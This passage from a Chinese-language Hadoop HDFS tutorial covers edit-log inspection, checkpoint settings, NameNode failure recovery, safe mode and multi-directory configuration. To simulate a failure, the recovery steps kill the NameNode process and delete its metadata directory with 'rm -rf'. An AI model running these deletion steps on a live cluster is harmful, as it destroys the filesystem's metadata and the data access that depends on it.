class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思考：可以看出，Fsimage中没有记录块所对应DataNode，为什么？<br>在集群启动后，要求DataNode上报数据块信息，并间隔一段时间后再次上报。<br>2）oev查看Edits文件<br>（1）基本语法<br>hdfs oev -p 文件类型 -i编辑日志 -o 转换后文件输出路径<br>（2）案例实操</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 current<span class="token punctuation">]</span>$ hdfs oev -p XML -i edits_0000000000000000012-0000000000000000013 -o /opt/module/hadoop-3.1.3/edits.xml<span class="token punctuation">[</span>molly@hadoop102 current<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/edits.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将显示的xml文件内容拷贝到Eclipse中创建的xml文件中，并格式化。显示结果如下。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EDITS</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EDITS_VERSION</span><span class="token punctuation">></span></span>-63<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>EDITS_VERSION</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_START_LOG_SEGMENT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>129<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_ADD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>130<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LENGTH</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LENGTH</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INODEID</span><span class="token punctuation">></span></span>16407<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>INODEID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>/hello7.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PATH</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>REPLICATION</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>REPLICATION</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MTIME</span><span class="token punctuation">></span></span>1512943607866<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MTIME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ATIME</span><span class="token punctuation">></span></span>1512943607866<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ATIME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCKSIZE</span><span class="token punctuation">></span></span>134217728<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCKSIZE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLIENT_NAME</span><span class="token punctuation">></span></span>DFSClient_NONMAPREDUCE_-1544295051_1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CLIENT_NAME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLIENT_MACHINE</span><span class="token punctuation">></span></span>192.168.1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CLIENT_MACHINE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OVERWRITE</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OVERWRITE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PERMISSION_STATUS</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span>molly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>USERNAME</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GROUPNAME</span><span class="token punctuation">></span></span>supergroup<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GROUPNAME</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MODE</span><span class="token punctuation">></span></span>420<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MODE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PERMISSION_STATUS</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RPC_CLIENTID</span><span class="token punctuation">></span></span>908eafd4-9aec-4288-96f1-e8011d181561<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RPC_CLIENTID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RPC_CALLID</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RPC_CALLID</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_ALLOCATE_BLOCK_ID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>131<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCK_ID</span><span class="token punctuation">></span></span>1073741839<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCK_ID</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_SET_GENSTAMP_V2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>132<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GENSTAMPV2</span><span class="token punctuation">></span></span>1016<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GENSTAMPV2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_ADD_BLOCK<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>133<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>/hello7.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PATH</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCK</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCK_ID</span><span class="token punctuation">></span></span>1073741839<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCK_ID</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUM_BYTES</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>NUM_BYTES</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GENSTAMP</span><span class="token punctuation">></span></span>1016<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GENSTAMP</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCK</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RPC_CLIENTID</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RPC_CLIENTID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RPC_CALLID</span><span class="token punctuation">></span></span>-2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RPC_CALLID</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RECORD</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OPCODE</span><span class="token punctuation">></span></span>OP_CLOSE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OPCODE</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TXID</span><span class="token punctuation">></span></span>134<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TXID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LENGTH</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LENGTH</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INODEID</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>INODEID</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>/hello7.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PATH</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>REPLICATION</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>REPLICATION</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MTIME</span><span class="token punctuation">></span></span>1512943608761<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MTIME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ATIME</span><span class="token punctuation">></span></span>1512943607866<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ATIME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCKSIZE</span><span class="token punctuation">></span></span>134217728<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCKSIZE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLIENT_NAME</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CLIENT_NAME</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLIENT_MACHINE</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CLIENT_MACHINE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OVERWRITE</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OVERWRITE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCK</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BLOCK_ID</span><span class="token punctuation">></span></span>1073741839<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCK_ID</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUM_BYTES</span><span class="token punctuation">></span></span>25<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>NUM_BYTES</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GENSTAMP</span><span class="token punctuation">></span></span>1016<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GENSTAMP</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BLOCK</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PERMISSION_STATUS</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span>molly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>USERNAME</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GROUPNAME</span><span class="token punctuation">></span></span>supergroup<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GROUPNAME</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MODE</span><span class="token punctuation">></span></span>420<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MODE</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PERMISSION_STATUS</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RECORD</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>EDITS</span> <span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思考：NameNode如何确定下次开机启动的时候合并哪些Edits？</p><h2 id="2-3-CheckPoint时间设置"><a href="#2-3-CheckPoint时间设置" class="headerlink" title="2.3 CheckPoint时间设置"></a>2.3 CheckPoint时间设置</h2><p>1）通常情况下，SecondaryNameNode每隔一小时执行一次。<br>    [hdfs-default.xml]</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.checkpoint.period<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>3600s<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）一分钟检查一次操作次数，当操作次数达到1百万时，SecondaryNameNode执行一次。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.checkpoint.txns<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>1000000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>操作动作次数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.checkpoint.check.period<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>60s<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span> 1分钟检查一次操作次数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span> <span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-4-NameNode故障处理（扩展）"><a href="#2-4-NameNode故障处理（扩展）" class="headerlink" title="2.4 NameNode故障处理（扩展）"></a>2.4 NameNode故障处理（扩展）</h2><p>NameNode故障后，可以采用如下两种方法恢复数据。<br>1）将SecondaryNameNode中数据拷贝到NameNode存储数据的目录；<br>（1）kill -9 NameNode进程<br>（2）删除NameNode存储的数据（/opt/module/hadoop-3.1.3/data/tmp/dfs/name）</p><pre class="line-numbers language-basn"><code class="language-basn">[molly@hadoop102 hadoop-3.1.3]$ rm -rf /opt/module/hadoop-3.1.3/data/dfs/name/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）拷贝SecondaryNameNode中数据到原NameNode存储数据目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ <span class="token function">scp</span> -r molly@hadoop104:/opt/module/hadoop-3.1.3/data/dfs/namesecondary/* ./name/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）重新启动NameNode</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs --daemon start namenode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）使用-importCheckpoint选项启动NameNode守护进程，从而将SecondaryNameNode中数据拷贝到NameNode目录中。<br>（1）修改hdfs-site.xml中的</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.checkpoint.period<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>120<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.name.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/module/hadoop-3.1.3/data/dfs/name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）kill -9 NameNode进程<br>（3）删除NameNode存储的数据（/opt/module/hadoop-3.1.3/data/dfs/name）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf /opt/module/hadoop-3.1.3/data/dfs/name/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）如果SecondaryNameNode不和NameNode在一个主机节点上，需要将SecondaryNameNode存储数据的目录拷贝到NameNode存储数据的平级目录，并删除in_use.lock文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ <span class="token function">scp</span> -r molly@hadoop104:/opt/module/hadoop-3.1.3/data/dfs/namesecondary ./<span class="token punctuation">[</span>molly@hadoop102 namesecondary<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf in_use.lock<span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/data/dfs<span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ <span class="token function">ls</span>data  name  namesecondary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）导入检查点数据（等待一会ctrl+c结束掉）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hdfs namenode -importCheckpoint<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）启动NameNode</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs --daemon start namenode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-5-集群安全模式"><a href="#2-5-集群安全模式" class="headerlink" title="2.5 集群安全模式"></a>2.5 集群安全模式</h2><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341980899.png" alt="1638341980899"></p><p>1）基本语法<br>集群处于安全模式，不能执行重要操作（写操作）。集群启动完成后，自动退出安全模式。<br>（1）bin/hdfs dfsadmin -safemode get        （功能描述：查看安全模式状态）<br>（2）bin/hdfs dfsadmin -safemode enter      （功能描述：进入安全模式状态）<br>（3）bin/hdfs dfsadmin -safemode leave    （功能描述：离开安全模式状态）<br>（4）bin/hdfs dfsadmin -safemode wait    （功能描述：等待安全模式状态）<br>2）案例<br>    模拟等待安全模式<br>3）查看当前模式</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs dfsadmin -safemode getSafe mode is OFF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）先进入安全模式</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hdfs dfsadmin -safemode enter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）创建并执行下面的脚本<br>在/opt/module/hadoop-3.1.3路径上，编辑一个脚本safemode.sh</p><pre class="line-numbers language-sh"><code class="language-sh">[molly@hadoop102 hadoop-3.1.3]$ touch safemode.sh[molly@hadoop102 hadoop-3.1.3]$ vim safemode.sh#!/bin/bashhdfs dfsadmin -safemode waithdfs dfs -put /opt/module/hadoop-3.1.3/README.txt /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">chmod</span> 777 safemode.sh<span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ ./safemode.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6）再打开一个窗口，执行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hdfs dfsadmin -safemode leave<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）观察<br>8）再观察上一个窗口<br>Safe mode is OFF<br>9）HDFS集群上已经有上传的数据了。</p><h2 id="2-6-NameNode多目录配置-了解"><a href="#2-6-NameNode多目录配置-了解" class="headerlink" title="2.6 NameNode多目录配置(了解)"></a>2.6 NameNode多目录配置(了解)</h2><p>1）NameNode的本地目录可以配置成多个，且每个目录存放内容相同，增加了可靠性<br>    2）具体配置如下<br>    （1）在hdfs-site.xml文件中添加如下内容</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.name.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file://$<span class="token entity" title="&#123;">&amp;#123;</span>hadoop.tmp.dir<span class="token entity" title="&#125;">&amp;#125;</span>/dfs/name1,file://$<span class="token entity" title="&#123;">&amp;#123;</span>hadoop.tmp.dir<span class="token entity" title="&#125;">&amp;#125;</span>/dfs/name2<span class="token tag"><span class="token tag"><span class="token 